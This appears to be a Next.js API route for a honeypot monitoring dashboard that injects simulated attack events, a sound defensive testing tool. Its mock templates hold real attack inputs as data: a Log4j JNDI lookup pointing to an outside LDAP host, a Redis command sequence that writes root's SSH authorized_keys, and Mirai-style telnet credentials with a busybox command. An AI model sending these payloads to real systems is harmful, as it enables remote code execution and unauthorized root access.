import { NextRequest, NextResponse } from 'next/server';
import { recordEvents, getNodes } from '@/lib/storage';
import { AttackEvent, EventSeverity, EventType } from '@/lib/types';

const MOCK_ATTACKS: Array<{
  protocol: string;
  destPort: number;
  eventType: EventType;
  severity: EventSeverity;
  payload: string;
  details: Record<string, string>;
}> = [
  {
    protocol: 'SSH',
    destPort: 22,
    eventType: 'auth_attempt',
    severity: 'critical',
    payload: 'Automated credential stuffing against root account',
    details: {
      username: 'root',
      password: 'password123',
      rawData: 'SSH-2.0-paramiko_2.11.0 client negotiation detected',
    },
  },
  {
    protocol: 'HTTP',
    destPort: 8080,
    eventType: 'vulnerability_exploit',
    severity: 'critical',
    payload: 'Apache Log4j JNDI RCE injection attempt (CVE-2021-44228)',
    details: {
      url: '/api/v1/search?q=${jndi:ldap://198.51.100.99:1389/Exploit}',
      method: 'GET',
      userAgent: 'curl/7.68.0 malicious probe',
    },
  },
  {
    protocol: 'TELNET',
    destPort: 23,
    eventType: 'auth_attempt',
    severity: 'high',
    payload: 'Mirai IoT botnet credential brute force probe',
    details: {
      username: 'default',
      password: 'oxhlwpassword',
      command: 'enable; shell; /bin/busybox cat /bin/busybox',
    },
  },
  {
    protocol: 'REDIS',
    destPort: 6379,
    eventType: 'command_exec',
    severity: 'critical',
    payload: 'Unauthenticated Redis CONFIG SET / SSH authorized_keys write attempt',
    details: {
      command: 'CONFIG SET dir /root/.ssh\r\nCONFIG SET dbfilename authorized_keys\r\nSAVE',
    },
  },
  {
    protocol: 'POSTGRES',
    destPort: 5432,
    eventType: 'auth_attempt',
    severity: 'medium',
    payload: 'PostgreSQL rogue DB connection probe',
    details: {
      username: 'postgres',
      password: 'postgres_master',
    },
  },
  {
    protocol: 'TCP',
    destPort: 445,
    eventType: 'port_scan',
    severity: 'low',
    payload: 'SMB EternalBlue (MS17-010) port scan probe',
    details: {
      rawData: 'TCP SYN on port 445 (SMB) from Masscan scanner',
    },
  },
];

const ATTACKER_IPS = [
  { ip: '185.220.101.5', country: 'Netherlands', city: 'Amsterdam', asn: 'AS208323' },
  { ip: '45.154.255.89', country: 'Seychelles', city: 'Victoria', asn: 'AS59604' },
  { ip: '89.248.165.74', country: 'Germany', city: 'Frankfurt', asn: 'AS202425' },
  { ip: '194.26.29.112', country: 'Russia', city: 'Moscow', asn: 'AS48287' },
  { ip: '167.99.192.3', country: 'United States', city: 'New York', asn: 'AS14061' },
  { ip: '103.149.28.190', country: 'Singapore', city: 'Singapore', asn: 'AS138997' },
  { ip: '91.240.118.230', country: 'Romania', city: 'Bucharest', asn: 'AS44034' },
];

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const nodes = getNodes();
    const targetNode =
      nodes.find((n) => n.id === body.agentId) ||
      nodes[Math.floor(Math.random() * nodes.length)] || {
        id: 'node_dmz_edge_01',
        name: 'DMZ Perimeter Sentinel',
        profileId: 'prof_linux_bastion',
      };

    const template =
      MOCK_ATTACKS[Math.floor(Math.random() * MOCK_ATTACKS.length)];
    const ipObj =
      ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];

    const attack: Omit<AttackEvent, 'id'> = {
      agentId: targetNode.id,
      agentName: targetNode.name,
      timestamp: new Date().toISOString(),
      sourceIp: body.sourceIp || ipObj.ip,
      sourcePort: Math.floor(10000 + Math.random() * 50000),
      destPort: body.destPort || template.destPort,
      protocol: body.protocol || template.protocol,
      honeypotType: targetNode.profileId.includes('cowrie') ? 'cowrie' : 'emulator',
      eventType: body.eventType || template.eventType,
      severity: body.severity || template.severity,
      details: {
        ...template.details,
        payload: body.payload || template.payload,
      },
      country: ipObj.country,
      city: ipObj.city,
      asn: ipObj.asn,
    };

    const [recorded] = recordEvents([attack]);

    return NextResponse.json(
      {
        message: 'Simulated attack injected successfully and broadcast via SSE',
        event: recorded,
      },
      { status: 201 }
    );
  } catch (err: unknown) {
    console.error('[Control API] Error simulating attack:', err);
    return NextResponse.json({ error: 'Simulation failed' }, { status: 500 });
  }
}
